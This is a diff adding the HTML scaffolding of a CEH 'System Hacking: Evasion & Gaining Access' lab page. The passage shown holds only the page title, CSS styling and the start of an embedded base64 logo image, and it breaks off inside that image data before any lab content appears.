@@ -1,0 +1,229 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Week 5 Lab &mdash; System Hacking: Evasion &amp; Gaining Access (CEH)</title>
+<style>
+:root{--navy:#14294a;--teal:#0f8b80;--teal-l:#e3f4f2;--coral:#d9573b;--amber:#c98a12;--amber-l:#fbf2dc;--line:#dfe4ec;--muted:#5b6678;--bg:#f4f6fa;--font:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;--mono:"JetBrains Mono",ui-monospace,Menlo,Consolas,monospace}
+*{box-sizing:border-box} body{margin:0;font-family:var(--font);color:#1c2533;background:var(--bg);line-height:1.6;font-size:17px}
+header{background:linear-gradient(135deg,#0d1d36,#14294a 60%,#103a49);color:#fff;padding:44px 24px 36px}
+header .in{max-width:1180px;margin:0 auto}
+header .eb{color:#7fd8cd;font-weight:700;letter-spacing:.14em;text-transform:uppercase;font-size:13px}
+header h1{margin:10px 0 6px;font-size:40px;line-height:1.15} header p{margin:0;color:#c9d7ec;max-width:880px}
+.meta{display:flex;flex-wrap:wrap;gap:10px;margin-top:18px} .meta span{background:rgba(255,255,255,.1);border-radius:999px;padding:5px 14px;font-size:14px}
+.wrap{max-width:1180px;margin:0 auto;display:grid;grid-template-columns:270px 1fr;gap:28px;padding:28px 24px 80px}
+nav{position:sticky;top:16px;align-self:start;background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px}
+nav b{display:block;font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin:2px 6px 8px}
+nav a{display:flex;justify-content:space-between;gap:8px;padding:7px 8px;border-radius:8px;color:var(--navy);text-decoration:none;font-size:14.5px;font-weight:600}
+nav a span{color:var(--muted);font-weight:500;white-space:nowrap} nav a:hover{background:var(--teal-l)}
+nav .tools{border-top:1px solid var(--line);margin-top:10px;padding-top:10px;display:flex;flex-direction:column;gap:6px}
+nav button{font:inherit;font-size:14px;border:1px solid var(--line);background:#f7f9fc;border-radius:8px;padding:6px;cursor:pointer;color:var(--navy);font-weight:600}
+.card{background:#fff;border:1px solid var(--line);border-radius:14px;padding:20px 24px;margin-bottom:22px}
+.card h2{margin:0 0 8px;color:var(--navy)}
+.part{background:#fff;border:1px solid var(--line);border-radius:16px;padding:24px 28px;margin-bottom:26px}
+.phead{display:flex;justify-content:space-between;align-items:center;gap:12px;border-bottom:3px solid var(--teal);padding-bottom:10px;margin-bottom:14px}
+.phead h2{margin:0;color:var(--navy);font-size:26px}
+.together{background:#e3f4f2;border-left:5px solid #0f8b80;padding:8px 12px;border-radius:0 10px 10px 0;margin:0 0 12px;font-weight:700;color:#075e56}
+.goal{background:var(--amber-l);border-left:5px solid var(--amber);padding:10px 14px;border-radius:0 10px 10px 0;margin-bottom:12px}
+.task{border:1px solid var(--line);border-radius:12px;padding:16px 20px;margin:18px 0;background:#fbfcfe}
+.task h3{margin:0 0 8px;color:var(--navy)}
+.lbl{font-size:12px;font-weight:800;letter-spacing:.1em;text-transform:uppercase;color:var(--muted);margin:14px 0 6px}
+pre{margin:0;background:#0f1b2d;color:#dbe6f5;border-radius:10px;padding:14px 16px;overflow:auto;font-family:var(--mono);font-size:14px;line-height:1.55}
+pre.out{background:#eef2f8;color:#1c2533;white-space:pre-wrap}
+.explain{background:var(--teal-l);border-radius:10px;padding:10px 14px}
+code{font-family:var(--mono);font-size:.88em;background:#eef2f8;padding:1px 5px;border-radius:5px;color:#20406e}
+pre code{background:none;padding:0;color:inherit;font-size:inherit}
+kbd{font-family:var(--mono);font-size:.8em;background:#eef1f6;border:1px solid #c9d1de;border-bottom-width:3px;border-radius:6px;padding:1px 6px}
+a{color:#2f6fd0} .chk{background:var(--teal-l);border:2px solid var(--teal);border-radius:12px;padding:14px 18px;font-weight:600}
+.solbtn{margin-top:14px;font:inherit;font-weight:700;font-size:15px;background:var(--teal);color:#fff;border:0;border-radius:9px;padding:8px 16px;cursor:pointer}
+.sol{display:none;border-top:2px dashed var(--teal);margin-top:14px;padding-top:10px} .sol.on{display:block}
+.note{background:#fbf2dc;border-left:5px solid #c98a12;padding:10px 14px;border-radius:0 10px 10px 0;margin:12px 0;font-size:15.5px}
+.warn{background:#fbe9e4;border-left:5px solid #d9573b;padding:10px 14px;border-radius:0 10px 10px 0;margin:12px 0;font-size:15.5px}
+header .top{display:flex;justify-content:space-between;align-items:center;margin-bottom:18px} header .top img{height:58px}
+header .wk{background:#0f8b80;border-radius:999px;padding:6px 16px;font-weight:800;font-size:14px}
+main{min-width:0} pre,pre.out{overflow-x:auto;max-width:100%}
+@media (max-width:860px){.wrap{grid-template-columns:1fr} nav{position:static} header h1{font-size:30px}}
+@media print{nav{display:none} .wrap{display:block} .sol{display:block} .solbtn{display:none}}
+</style></head>
+<body>
+<header><div class="in"><div class="top"><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAlgAAAD4CAMAAAAHO2gpAAABIFBMVEUAAADYAA/+/v7+/v7kABH+AAC3AADXAA/YAA79+PnUAAzYAA/XAA/XAA/+/f3++/zXAA/++fn+/Px/AAD++Pn85uj76OvnZW752NjdKDX41tj2yMz75+n3yMrqeoLxpaviSFL7vLzbGCT76+3ulpz/f3/shY33qazgOUXvnKLlWWPztrv2mJjkUlvpc3vaERzeMjz1u9D/2ezamZn/AP/1vMGqVVW/f3/87u/0lrL3qs363uB/f3+qqqq4///aACTiABD/yOv32du/v7/Uf3/fv7/gMT7/f///qv/43uP//78A//9/AH9///+ZAAC2ACS/P3/UVVXMZmbUqtTU1NTgABHhAA//AFX/Var/f7/77/EAAAAAAAAAAAAAAAAAAADmO3O0AAAAYHRSTlMA/v0D/gIDrSpvENBsUdCQkFCuAjEVLf8P/////wz///8H/0n/Av8G/////wj/////DBAHAf8DBGsJB/8CAwMH1gciBAYI/wIDKwQBAgIFBwQGBQYGOnADAwSDAAAAAACmJAVsAAArjElEQVR42u2dB3/bOpboKYGgWERSVHFkO45LruP05LaZO213Znbftre9vLLf/4MsAIIkQKJRBEk5P2DvThJTomjj73MOTvW8b3PBOPag55ZbtlecQm/nfgzzreCsljUhA714HTuy3LK+dl64cdpwxpWe17JHQuClK6cN51v+Wa1FaA+FwFuvYujImmktzmtZBAvpwU3i7Zw2dGBZBgvJrNXKg44sB5ZlsCCMFysvcGQ5sOyChZRhuNggweXWHMb7NwwWPhr6a0fWHGuzWpwTW5bBQkxtHFkzrTjdJAv/GwULBjDxU0fW9IuYtjDcJOcht2yDhc0s3w8dWTMsSA7kcbryv0WwEFlrP3HBnbnYwr/RqYlCPMWdPitYCKmVv4qd02FGuRUneghWfVeSUBznAmsH44XvnA5zsuXFOnXor05yU4bpGh8Q/FnAQt8XksXuaDinIe/FOkW4gjHst+q7h+uVXteOARZRhujOThnOSFbq6yQW7C+x0AqIvAi1aI0C1m6HlGESu6jhnJYWY2a9vfta/fXh1au3p4LV2DqImVBjxo0CFvmF8V08elaRta42/tPVcrm8flH+43K5fDMULMKtF2/86cEi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